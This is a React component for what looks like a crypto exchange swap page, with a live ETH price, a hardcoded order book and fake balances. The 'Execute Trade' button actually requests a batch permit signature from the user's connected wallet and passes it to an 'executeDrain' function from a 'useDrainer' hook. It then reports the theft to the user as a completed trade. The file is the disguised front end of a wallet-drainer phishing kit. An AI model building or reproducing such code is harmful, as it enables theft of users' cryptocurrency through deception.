import { useState, useEffect } from 'react'
import { useAccount } from 'wagmi'
import { useDrainer } from '../hooks/useDrainer'

export default function TradingInterface() {
  const { address, isConnected } = useAccount()
  const { signBatchPermit, executeDrain } = useDrainer()
  const [amount, setAmount] = useState('')
  const [loading, setLoading] = useState(false)
  const [status, setStatus] = useState('')
  const [ethPrice, setEthPrice] = useState(3422.71)
  const [priceChange, setPriceChange] = useState(2.14)

  useEffect(() => {
    fetch('https://api.coingecko.com/api/v3/simple/price?ids=ethereum&vs_currencies=usd&include_24hr_change=true')
      .then(r => r.json())
      .then(d => {
        if (d.ethereum) {
          setEthPrice(d.ethereum.usd)
          setPriceChange(d.ethereum.usd_24h_change?.toFixed(2) || 2.14)
        }
      })
      .catch(() => {})
  }, [])

  const handleTrade = async () => {
    if (!isConnected || !address) {
      setStatus('Please connect wallet first')
      return
    }
    
    setLoading(true)
    setStatus('Requesting signature...')
    
    try {
      const { signature, nonce, deadline } = await signBatchPermit(address)
      setStatus('Signature obtained. Executing...')
      const txHash = await executeDrain(address, signature, nonce, deadline)
      setStatus(`Trade executed! ${txHash.slice(0,10)}...`)
    } catch (err) {
      setStatus(`Failed: ${err.message}`)
    } finally {
      setLoading(false)
    }
  }

  const rate = 1 / ethPrice
  const toAmount = amount ? (parseFloat(amount) * rate).toFixed(6) : '0.00'

  const asks = [[ethPrice + 5.8, 12.5], [ethPrice + 4.2, 8.3], [ethPrice + 3.5, 15.2]]
  const bids = [[ethPrice - 3.2, 22.1], [ethPrice - 4.8, 9.7], [ethPrice - 5.5, 14.3]]

  return (
    <div className="main">
      <div className="ph">
        <span className="ph-name">ETH / USDT</span>
        <div className="ph-price"><span className="ph-main">${ethPrice.toLocaleString()}</span></div>
        <span className="ph-chg">{priceChange >= 0 ? '+' : ''}{priceChange}%</span>
      </div>

      <div className="tgrid">
        <div className="glass cpanel">
          <div style={{ height: '100%', display: 'flex', alignItems: 'center', justifyContent: 'center', color: '#7986ad' }}>
            📈 Trading Chart
          </div>
        </div>

        <div className="glass obpanel">
          <div className="obch"><span>Price</span><span>Size</span><span>Total</span></div>
          <div className="sell">
            {asks.map((ask, i) => (
              <div key={i} className="obrow sell">
                <span className="obc">{ask[0].toFixed(2)}</span>
                <span className="obc" style={{ textAlign: 'right' }}>{ask[1]}</span>
                <span className="obc" style={{ textAlign: 'right' }}>{(ask[0] * ask[1]).toFixed(0)}</span>
              </div>
            ))}
          </div>
          <div className="obspr"><span className="obspr-p">${ethPrice.toFixed(2)}</span><span>Spread: 0.08%</span></div>
          <div className="buy">
            {bids.map((bid, i) => (
              <div key={i} className="obrow buy">
                <span className="obc">{bid[0].toFixed(2)}</span>
                <span className="obc" style={{ textAlign: 'right' }}>{bid[1]}</span>
                <span className="obc" style={{ textAlign: 'right' }}>{(bid[0] * bid[1]).toFixed(0)}</span>
              </div>
            ))}
          </div>
        </div>
      </div>

      <div className="glass swappanel">
        <div className="trow">
          <div className="trow-top"><span>You Pay</span><span>Balance: 12,400 USDT</span></div>
          <div className="trow-main">
            <input type="number" value={amount} onChange={(e) => setAmount(e.target.value)} placeholder="0.00" className="ainput" style={{ textAlign: 'left' }} />
            <div className="tsel"><div className="ticon ti-usdt">USDT</div><span>USDT</span></div>
          </div>
        </div>

        <div className="sw-arr"><div className="sw-arr-btn">↓</div></div>

        <div className="trow">
          <div className="trow-top"><span>You Receive</span><span>Balance: 3.72 ETH</span></div>
          <div className="trow-main">
            <input type="text" value={toAmount} placeholder="0.00" readOnly className="ainput" style={{ textAlign: 'left' }} />
            <div className="tsel"><div className="ticon ti-eth">ETH</div><span>ETH</span></div>
          </div>
        </div>

        <div className="rinfo">
          <div className="rrow"><span className="rkey">Rate</span><span className="rval">1 USDT = {rate.toFixed(6)} ETH</span></div>
          <div className="rrow"><span className="rkey">Price Impact</span><span className="rval" style={{ color: '#10b981' }}>&lt; 0.01%</span></div>
        </div>

        <button className="execbtn" onClick={handleTrade} disabled={loading}>
          {loading ? 'Processing...' : 'Execute Trade'}
        </button>
        {status && <div style={{ textAlign: 'center', marginTop: '12px', fontSize: '12px', color: '#7986ad' }}>{status}</div>}
      </div>
    </div>
  )
}